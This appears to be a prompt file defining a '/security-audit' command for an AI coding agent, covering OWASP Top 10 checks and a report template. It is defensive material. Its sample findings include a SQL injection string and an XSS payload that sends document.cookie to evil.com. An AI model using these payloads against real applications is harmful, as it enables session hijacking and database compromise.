---
description: Comprehensive security vulnerability scan based on OWASP Top 10, authentication, authorization, and secure coding practices
model: github-copilot/gpt-5.2-codex
---

# Security Audit

Perform a comprehensive security vulnerability assessment across your codebase or specific components.

## Usage

```
/security-audit [scope]
```

**Examples:**
- `/security-audit src/api/` - Audit entire API directory
- `/security-audit src/auth/AuthService.cs` - Audit specific file
- `/security-audit .` - Audit entire codebase (current directory)
- `/security-audit feature/user-authentication` - Audit feature branch changes

## What This Command Does

This command launches the **security-reviewer** agent to perform:

1. **OWASP Top 10 Assessment** (2021):
   - A01: Broken Access Control
   - A02: Cryptographic Failures
   - A03: Injection (SQL, Command, NoSQL)
   - A04: Insecure Design
   - A05: Security Misconfiguration
   - A06: Vulnerable and Outdated Components
   - A07: Identification and Authentication Failures
   - A08: Software and Data Integrity Failures
   - A09: Security Logging and Monitoring Failures
   - A10: Server-Side Request Forgery (SSRF)

2. **Language-Specific Security Checks**:
   - **C#/.NET**: Parameterized queries, [Authorize] attributes, password hashing, anti-forgery tokens
   - **React**: XSS via dangerouslySetInnerHTML, CSP, secure state management
   - **PostgreSQL**: SQL injection prevention, prepared statements, row-level security
   - **Infrastructure**: Secrets exposure, IAM permissions, encryption settings

3. **Authentication & Authorization**:
   - Missing authentication checks
   - Authorization bypass vulnerabilities (IDOR)
   - Session management issues
   - JWT vulnerabilities
   - Weak password policies

4. **Data Protection**:
   - Sensitive data exposure in logs
   - Unencrypted data at rest/in transit
   - PII handling compliance
   - Hardcoded secrets/credentials

## Output

You'll receive a comprehensive security assessment:

```markdown
## Security Audit: [Component/Feature]

### Executive Summary
**Risk Level**: [CRITICAL/HIGH/MEDIUM/LOW]
**Total Findings**: [N] ([breakdown by severity])

### Critical Findings 🔴 [IMMEDIATE ACTION REQUIRED]
[Must fix immediately - escalate to Security Team + Engineering Manager + CTO]

#### [Vulnerability Title] [CRITICAL]
**Location**: `file.cs:123`
**OWASP Category**: [A03: Injection]
**Problem**: [Specific vulnerability]
**Attack Scenario**: [How attacker exploits this]
**Impact**: [Data breach / RCE / account takeover]
**Remediation**: [Code fix with example from security-patterns]
**Verification**: [How to test fix]

### High-Risk Findings 🟡 [URGENT - Address Within Sprint]
[Notify Engineering Manager within 24h]

### Medium/Low Findings ⚪ [Backlog Items]
[Security improvements for backlog]

### Positive Security Practices ✅
[Patterns done correctly]

### Recommendations [Priority Order]
1. [CRITICAL] [Action]
2. [HIGH] [Action]
3. [MEDIUM] [Action]
```

## Severity Definitions

- **CRITICAL** 🔴: SQL injection, authentication bypass, RCE, hardcoded secrets, public S3 buckets
  - **Action**: Immediate fix required, escalate to Security Team + Engineering Manager + CTO
  - **Timeline**: Fix within 24 hours

- **HIGH** 🟡: XSS, CSRF, IDOR, privilege escalation, missing encryption
  - **Action**: Notify Engineering Manager + Security Team within 24h
  - **Timeline**: Fix within current sprint

- **MEDIUM** ⚪: Missing security headers, weak validation, insecure configurations
  - **Action**: Create security backlog tickets
  - **Timeline**: Address in next 2-3 sprints

- **LOW** ⚪: Security hardening, defence-in-depth improvements
  - **Action**: Document for future improvement
  - **Timeline**: Backlog, prioritize based on risk tolerance

## Escalation Protocol

**CRITICAL Issues** - Immediate escalation:
1. Notify Security Team immediately
2. Notify Engineering Manager immediately
3. Notify CTO immediately
4. Block deployment if in pipeline
5. Create incident ticket
6. Schedule emergency fix

**HIGH Issues** - 24-hour escalation:
1. Notify Engineering Manager within 24h
2. Notify Security Team within 24h
3. Prioritize for current sprint
4. Document in security log

## Value

**Time saved**: 45-60 minutes per audit
**Quality improvement**: Systematic security checks, consistent standards
**Frequency**: 
- Before every merge to main/master (critical changes)
- Weekly for ongoing development
- Before major releases
- After dependency updates

## Common Vulnerabilities Detected

### C#/.NET
- SQL injection via Entity Framework raw queries
- Missing [Authorize] attributes on API endpoints
- Hardcoded connection strings or API keys
- Weak password hashing (MD5, SHA1 without salt)
- Missing anti-forgery tokens on POST/PUT/DELETE
- PII in application logs

### React
- XSS via dangerouslySetInnerHTML without sanitization
- Sensitive data in localStorage (use httpOnly cookies)
- Missing Content Security Policy
- Direct state mutations
- API keys in frontend code

### Angular
- Missing DomSanitizer for dynamic content
- Unsubscribed observables exposing data
- Insecure HTTP interceptors
- Missing route guards on protected routes

### Infrastructure (Pulumi/AWS)
- Hardcoded credentials in IaC
- Public S3 buckets
- Overly permissive IAM roles (wildcard *)
- Security groups with 0.0.0.0/0 on non-HTTP ports
- Missing encryption at rest
- No CloudTrail audit logging

## Prompt

You are performing a comprehensive security audit to identify vulnerabilities before they reach production.

### Instructions

1. **Understand the scope**:
   - Identify files/directories to audit
   - Detect primary languages and frameworks
   - Understand application context (API, frontend, infrastructure)

2. **Launch security-reviewer agent** with the code to audit

3. **Perform systematic OWASP Top 10 check** using the **security-patterns** skill:
   
   **A01: Broken Access Control**
   - Missing authorization checks ([Authorize] attributes in C#)
   - IDOR vulnerabilities (insecure direct object references)
   - Horizontal/vertical privilege escalation
   
   **A02: Cryptographic Failures**
   - Weak encryption algorithms (MD5, SHA1)
   - Missing encryption at rest/in transit
   - Hardcoded cryptographic keys
   
   **A03: Injection**
   - SQL injection (raw queries, string concatenation)
   - Command injection (shell execution with user input)
   - NoSQL injection
   - LDAP injection
   
   **A04: Insecure Design**
   - Missing rate limiting on authentication
   - No account lockout after failed attempts
   - Predictable session tokens
   
   **A05: Security Misconfiguration**
   - Default credentials
   - Verbose error messages in production
   - Missing security headers (CSP, HSTS, X-Frame-Options)
   - Unpatched dependencies
   
   **A06: Vulnerable Components**
   - Outdated libraries with known CVEs
   - Deprecated security functions
   
   **A07: Authentication Failures**
   - Weak password policy (<8 chars)
   - No MFA on critical functions
   - Session tokens in URL parameters
   - Missing session timeout
   
   **A08: Data Integrity Failures**
   - Unsigned/unverified data
   - Insecure deserialization
   - CI/CD pipeline security
   
   **A09: Logging Failures**
   - No audit trail for critical actions
   - PII/passwords in logs
   - Missing security event logging
   
   **A10: SSRF**
   - User-controlled URLs in server requests
   - No URL validation/allowlisting

4. **Check language-specific patterns** using relevant skills:
   - **csharp-patterns**: .NET security patterns
   - **react-patterns**: React security patterns
   - **postgresql-patterns**: Database security patterns
   - **pulumi-patterns**: Infrastructure security

5. **Categorize findings by severity**:
   - Use **code-review-patterns** for consistent severity assessment
   - CRITICAL: Immediate data breach/compromise risk
   - HIGH: Exploitable with moderate effort
   - MEDIUM: Requires specific conditions to exploit
   - LOW: Defence-in-depth improvements

6. **Generate comprehensive security report** using this format:

```markdown
## Security Audit Report: [Component/Feature]

**Audit Date**: [Date]
**Scope**: [Files/directories audited]
**Languages**: [C#, React, Angular, etc.]
**Auditor**: security-reviewer agent

---

### Executive Summary

**Overall Risk Level**: [CRITICAL/HIGH/MEDIUM/LOW]

**Findings Summary**:
- 🔴 CRITICAL: [N] findings
- 🟡 HIGH: [N] findings
- ⚪ MEDIUM: [N] findings
- ⚪ LOW: [N] findings

**Total Vulnerabilities**: [N]

**Recommendation**: [Safe to deploy / Requires fixes before deployment / Immediate action required]

---

### CRITICAL Findings 🔴 [IMMEDIATE ACTION REQUIRED]

#### [Vulnerability Title] [CRITICAL]

**Location**: `src/api/UserController.cs:145`

**OWASP Category**: A03: Injection

**Problem**: 
SQL injection vulnerability via string concatenation in user search query. User input is not parameterized, allowing arbitrary SQL execution.

**Code**:
```csharp
var query = $"SELECT * FROM Users WHERE Username = '{username}'";
var users = context.Users.FromSqlRaw(query).ToList();
```

**Attack Scenario**:
Attacker inputs: `admin' OR '1'='1' --`
Resulting query: `SELECT * FROM Users WHERE Username = 'admin' OR '1'='1' --'`
Impact: Bypasses authentication, returns all users, potential data exfiltration

**Impact**: 
- Complete database compromise
- Data breach (all user data accessible)
- Potential data modification/deletion
- Authentication bypass

**Remediation**:
Use parameterized queries (from **security-patterns** skill):

```csharp
// SECURE: Parameterized query prevents SQL injection
var query = "SELECT * FROM Users WHERE Username = {0}";
var users = context.Users.FromSqlRaw(query, username).ToList();

// BETTER: Use LINQ (automatically parameterized)
var users = context.Users.Where(u => u.Username == username).ToList();
```

**Verification**:
1. Replace string concatenation with parameterized query
2. Test with malicious input: `admin' OR '1'='1' --`
3. Verify query returns only intended results
4. Run security scan to confirm fix

**Escalation**: 
- ✅ Security Team notified
- ✅ Engineering Manager notified
- ✅ CTO notified
- ⏸️ Deployment blocked until fixed

---

[Repeat for each CRITICAL finding]

---

### High-Risk Findings 🟡 [URGENT]

#### [Vulnerability Title] [HIGH]

**Location**: `src/components/UserProfile.tsx:89`

**OWASP Category**: A03: Injection (XSS)

**Problem**:
Cross-Site Scripting (XSS) vulnerability via dangerouslySetInnerHTML without sanitization.

**Code**:
```tsx
<div dangerouslySetInnerHTML={{ __html: userBio }} />
```

**Attack Scenario**:
User sets bio to: `<script>fetch('https://evil.com?cookie='+document.cookie)</script>`
Impact: Session hijacking, credential theft

**Impact**:
- Session token theft
- Account takeover
- Malware distribution to other users

**Remediation** (from **react-patterns** skill):
```tsx
import DOMPurify from 'dompurify';

// SECURE: Sanitize HTML before rendering
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userBio) 
}} />

// BETTER: Avoid dangerouslySetInnerHTML entirely
<div>{userBio}</div>  // React auto-escapes text content
```

**Escalation**:
- ⏰ Engineering Manager notified (within 24h)
- ⏰ Security Team notified (within 24h)
- 📋 Sprint priority: HIGH

---

[Repeat for each HIGH finding]

---

### Medium-Risk Findings ⚪

[List MEDIUM findings with location, problem, fix]

---

### Low-Risk Findings ⚪

[List LOW findings for backlog]

---

### Positive Security Practices ✅

[Acknowledge good patterns observed]:
- ✅ All API endpoints use [Authorize] attributes
- ✅ Passwords hashed with BCrypt (strong algorithm)
- ✅ Entity Framework LINQ queries (parameterized by default)
- ✅ Anti-forgery tokens on all state-changing operations
- ✅ HTTPS enforced across application

---

### Compliance Status

**PCI-DSS**: [Compliant / Issues identified]
**GDPR**: [Compliant / Issues identified]
**SOC 2**: [Compliant / Issues identified]

---

### Recommendations [Priority Order]

1. **[CRITICAL]** Fix SQL injection in UserController.cs:145 (IMMEDIATE)
2. **[CRITICAL]** Remove hardcoded API keys in AppSettings.cs:23 (IMMEDIATE)
3. **[HIGH]** Sanitize dangerouslySetInnerHTML in UserProfile.tsx:89 (This sprint)
4. **[HIGH]** Add rate limiting to /api/auth/login endpoint (This sprint)
5. **[MEDIUM]** Add Content-Security-Policy header (Next 2 sprints)
6. **[MEDIUM]** Implement security logging for failed auth attempts (Backlog)
7. **[LOW]** Update outdated dependencies with known CVEs (Backlog)

---

### Next Steps

**Immediate (within 24h)**:
1. Fix all CRITICAL vulnerabilities
2. Notify stakeholders per escalation protocol
3. Block deployment until critical fixes verified
4. Schedule security re-scan after fixes

**Short-term (this sprint)**:
1. Address all HIGH vulnerabilities
2. Create security backlog tickets for MEDIUM/LOW
3. Document lessons learned
4. Update security checklist

**Long-term**:
1. Implement automated security scanning in CI/CD
2. Schedule regular security training
3. Establish security champions program
4. Quarterly penetration testing

---

### Audit Metadata

**Files Scanned**: [N]
**Lines of Code**: [N]
**Scan Duration**: [X] minutes
**Last Audit**: [Previous audit date]
**Next Audit**: [Recommended date]
```

7. **Reference loaded skills**:
   - **security-patterns**: OWASP Top 10, remediation examples
   - **csharp-patterns**: .NET security patterns
   - **react-patterns**: React security patterns
   - **postgresql-patterns**: Database security patterns
   - **pulumi-patterns**: Infrastructure security
   - **code-review-patterns**: Severity categorization

### Important Notes

- **Zero false positives tolerance** - Every finding must be verified and actionable
- **Provide exact line numbers** - Make fixes easy to locate
- **Include code examples** - Show both vulnerable and secure versions
- **Explain attack scenarios** - Help developers understand real-world impact
- **Follow escalation protocol** - CRITICAL issues require immediate notification

### If No Vulnerabilities Found

If the audit finds no issues:

```markdown
## Security Audit Report: [Component/Feature]

### Executive Summary

**Risk Level**: LOW ✅

**Findings**: No vulnerabilities identified

### Security Posture Assessment

This codebase demonstrates strong security practices:
- ✅ All authentication/authorization checks present
- ✅ Parameterized queries throughout
- ✅ Input validation and sanitization
- ✅ No hardcoded secrets
- ✅ Secure cryptographic algorithms
- ✅ Proper error handling without information leakage

### Recommendations

Continue following these excellent security practices. Schedule next audit in [timeframe].
```

Use the **security-reviewer** agent with access to:
- **security-patterns** skill (primary)
- **csharp-patterns** skill
- **react-patterns** skill
- **postgresql-patterns** skill
- **pulumi-patterns** skill
- **code-review-patterns** skill

Deliver actionable security findings that protect Avayler's applications and data.
